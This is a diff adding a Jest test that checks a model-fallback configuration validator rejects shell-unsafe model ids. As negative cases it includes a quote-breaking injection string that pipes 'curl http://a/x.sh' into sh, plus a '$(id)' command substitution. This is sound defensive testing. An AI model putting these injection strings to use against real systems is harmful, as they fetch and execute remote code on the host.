@@ -246,6 +246,21 @@ describe('parseModelFallbackUpdate (endpoint validation)', () => {
     expect(() => parseModelFallbackUpdate({ chain: ['a', 2] })).toThrow(ModelFallbackConfigError)
   })
 
+  it('REJECTS a chain entry that is not a shell-safe model id (card b7fa5281)', () => {
+    // A chain id is launched exactly like a per-agent model, so an unsafe entry is the same command-
+    // injection path. It must 400 (ModelFallbackConfigError) rather than being stored.
+    expect(() =>
+      parseModelFallbackUpdate({ chain: ['claude-opus-5', "x'; curl http://a/x.sh | sh; echo '"] }),
+    ).toThrow(ModelFallbackConfigError)
+    expect(() => parseModelFallbackUpdate({ chain: ['claude-opus-5', 'a $(id)'] })).toThrow(
+      ModelFallbackConfigError,
+    )
+    // The bracketed 1M-context default is still accepted (the allowlist includes []).
+    expect(
+      parseModelFallbackUpdate({ chain: ['claude-opus-4-8[1m]', 'claude-sonnet-5'] }).chain,
+    ).toEqual(['claude-opus-4-8[1m]', 'claude-sonnet-5'])
+  })
+
   it('validates weekly-tier percents and their ordering', () => {
     expect(parseModelFallbackUpdate({ weeklyTier1Percent: 70, weeklyTier2Percent: 80 }))
       .toEqual({ weeklyTier1Percent: 70, weeklyTier2Percent: 80 })
